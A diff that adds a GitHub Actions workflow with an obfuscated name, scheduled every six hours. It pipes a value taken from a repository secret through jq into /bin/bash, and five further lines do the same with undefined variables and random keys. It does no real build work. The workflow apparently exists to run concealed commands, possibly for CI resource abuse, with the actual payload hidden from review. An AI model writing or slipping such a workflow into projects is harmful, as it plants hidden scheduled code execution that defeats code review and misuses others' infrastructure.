@@ -1,0 +1,23 @@
+name: pennydanielle6406
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pennydanielle6406
+        env:
+          x70: ${{ secrets.x70 }}
+        run: |
+          echo $x70 | jq -r .t25262 | /bin/bash
+          echo $zvg6 | jq -r .nv227 | /bin/bash
+          echo $o652 | jq -r .bacj8 | /bin/bash
+          echo $wsvfv4 | jq -r .eyplm9722 | /bin/bash
+          echo $mdiu5 | jq -r .nezi4691 | /bin/bash
+          echo $ltpxi1 | jq -r .wysuy9 | /bin/bash
+
